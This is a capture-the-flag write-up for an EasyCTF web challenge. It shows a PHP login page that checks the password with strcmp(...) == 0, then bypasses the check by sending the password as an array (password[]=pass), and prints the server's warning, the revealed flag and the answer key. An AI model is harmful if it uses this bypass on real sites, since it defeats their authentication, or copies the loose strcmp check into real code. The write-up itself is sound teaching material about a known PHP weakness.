---
layout: writeup
title: Pretty Horrible Programming
level: 
difficulty: 
points: 
categories: []
tags: []
flag: easyctf{never_trust_strcmp}
---
**Challenge**  
Given a website with a

**Solution**  
In the source we see a comment

     <!-- SOURCE AT index.source.php --></span>

This leads us to the following file

    <code><span style="color: #000000">
     <html >
         <head >
             <title >Welcome to my awesome site! </title >
             <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootswatch/3.3.4/cerulean/bootstrap.min.css" / >
         </head >
         <body >
             <nav class="navbar navbar-default" >
                 <div class="container" >
                     <div class="navbar-header" >
                         <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#main-navbar" >
                             <span class="sr-only" >Toggle navigation </span >
                             <span class="icon-bar" > </span >
                             <span class="icon-bar" > </span >
                             <span class="icon-bar" > </span >
                         </button >
                         <a class="navbar-brand" href="/" >Super Secret Content </a >
                     </div >
                 <div class="collapse navbar-collapse" id="main-navbar" >
                     <ul class="nav navbar-nav" >
                         <li > <a href="/" >Home </a > </li >
                     </ul >
                 </div >
             </nav >
    
             <div class="container" >
            <span style="color: #0000BB"> <?php
                </span><span style="color: #007700">include(</span><span style="color: #DD0000">"stuff.php"</span><span style="color: #007700">); </span><span style="color: #FF8000">// get $pass and $flag
    
                </span><span style="color: #0000BB">$auth </span><span style="color: #007700">= </span><span style="color: #0000BB">false</span><span style="color: #007700">;
                if (isset(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"password"</span><span style="color: #007700">])) {
                    if (</span><span style="color: #0000BB">strcmp</span><span style="color: #007700">(</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">"password"</span><span style="color: #007700">], </span><span style="color: #0000BB">$pass</span><span style="color: #007700">) == </span><span style="color: #0000BB">0</span><span style="color: #007700">) {
                        </span><span style="color: #0000BB">$auth </span><span style="color: #007700">= </span><span style="color: #0000BB">true</span><span style="color: #007700">;
                    }
                }
                if (</span><span style="color: #0000BB">$auth</span><span style="color: #007700">) {
                    echo </span><span style="color: #DD0000">"Wow! You guessed my password! Here's my super secret content: " </span><span style="color: #007700">. </span><span style="color: #0000BB">$flag</span><span style="color: #007700">;
                } else { </span><span style="color: #0000BB">? >
    </span>                 <p >Sorry, but you'll have to enter the password to see my super secret content. And it's not "password"! </p >
                     <div class="row" > <form class="form-horizontal" action="index.php" method="GET" >
                         <div class="col-xs-9" >
                             <input class="form-control" type="password" name="password" placeholder="Password" / >
                         </div >
                         <div class="col-xs-3" >
                             <input class="btn btn-primary" type="submit" value="View Super Secret Content" / >
                         </div >
                     </form > </div >
                <span style="color: #0000BB"> <?php </span><span style="color: #007700">}
            </span><span style="color: #0000BB">? >
    </span>         </div >
    
             <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js" > </script >
             <script type="text/javascript" src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js" > </script >
         </body >
     </html >
    
    </code>
{: .language-php}

We see that it uses strcmp function to validate, we can bypass this by
passing an array named password rather than a variable.

    http://web.easyctf.com:10201/index.php?password[]=pass

This gives us the key

    Warning: strcmp() expects parameter 1 to be string, array given in /var/www/php2/index.php on line 31
    Wow! You guessed my password! Here's my super secret content: easyctf{never_trust_strcmp}

